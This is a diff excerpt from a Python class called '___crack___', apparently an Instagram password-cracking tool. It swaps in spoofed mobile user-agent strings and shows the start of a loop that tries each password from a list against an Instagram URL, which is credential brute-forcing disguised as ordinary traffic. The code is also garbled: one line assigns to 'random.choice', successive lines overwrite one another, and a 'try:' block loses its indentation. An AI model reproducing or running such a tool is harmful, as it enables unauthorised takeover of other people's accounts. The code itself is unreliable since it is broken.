@@ -411,9 +411,8 @@ class ___crack___:
             ___useragent = random.choice = ___roz('').text
             ___useragent = ___roz('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
             ___useragent = ___roz('Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (21/5.0.2; 480dpi; 1080x1920; Xiaomi; Redmi Note 3; hennessy; mt6795; ru_RU; 105842053')
-            ___useragent = ___roz('Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI MediaPad T1 7.0 3G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/58.2.2878.53403')
-            ___useragent = ___roz('Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 Instagram 141.0.0.32.118 Android (22/5.1.1; 240dpi; 540x960; samsung; SM-J200H; j23g; sc8830; fr_FR; 214245288')
-        try:
+            ___useragent = ___roz('Mozilla/5.0 (Linux; Android 9; Mi A3 Build/PKQ1.190416.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.111 Mobile Safari/537.36 Instagram 138.0.0.28.117 Android (28/9; 320dpi; 720x1411; Xiaomi; Mi A3; laurel_sprout; qcom; fr_FR; 210180521')
+            try:
             for pw in pwx:
                 pw = pw.lower()
                 ___url = ('https://z-p42.www.instagram.com/')
